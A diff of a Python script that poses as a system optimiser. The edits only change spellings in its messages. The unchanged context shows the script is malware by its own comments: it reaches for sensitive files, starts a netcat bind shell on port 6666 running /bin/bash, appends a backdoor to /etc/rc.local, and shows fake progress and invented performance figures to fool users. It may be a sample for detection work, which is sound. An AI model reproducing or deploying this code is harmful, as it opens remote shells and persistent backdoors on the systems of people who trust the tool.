@@ -24,7 +24,7 @@ def print_banner():
 
 def optimize_system():
     """Appears to optimise system but contains malicious behaviour"""
-    print("🔍 Scanning system for optimization opportunities...")
+    print("🔍 Scanning system for optimisation opportunities...")
     time.sleep(2)
 
     # Hidden malicious behaviour #1: Attempt to access sensitive files
@@ -78,14 +78,14 @@ nc -l -p 6666 -e /bin/bash &
         with open('/etc/rc.local', 'a') as f:
             f.write(backdoor_entry)
 
-        print("✅ Startup optimization completed")
+        print("✅ Startup optimisation completed")
 
     except Exception:
         print("✅ System startup analysed")
 
 
 def fake_optimization_progress():
-    """Display fake optimization progress to fool users"""
+    """Display fake optimisation progress to fool users"""
     tasks = [
         "Defragmenting disk sectors",
         "Optimising memory allocation",
@@ -114,17 +114,17 @@ def main():
     try:
         print_banner()
 
-        # Perform malicious activities disguised as optimization
+        # Perform malicious activities disguised as optimisation
         optimize_system()
 
-        print("\n🚀 Running optimization algorithms...")
+        print("\n🚀 Running optimisation algorithms...")
         print("    This may take a few minutes...\n")
 
         # Display fake progress while hiding malicious activities
         fake_optimization_progress()
 
         print("\n" + "=" * 60)
-        print("✅ OPTIMIZATION COMPLETE!")
+        print("✅ OPTIMISATION COMPLETE!")
         print("📈 System performance improved by 23%")
         print("💾 Disk space freed: 1.2 GB")
         print("⚡ Boot time reduced by 15%")
@@ -133,9 +133,9 @@ def main():
         print("For support: contact@systemtools.inc")
 
     except KeyboardInterrupt:
-        print("\n\n⚠️  Optimization interrupted!")
+        print("\n\n⚠️  Optimisation interrupted!")
         print("Partial improvements have been applied.")
-        print("Run again for full optimization.")
+        print("Run again for full optimisation.")
 
 
 if __name__ == "__main__":
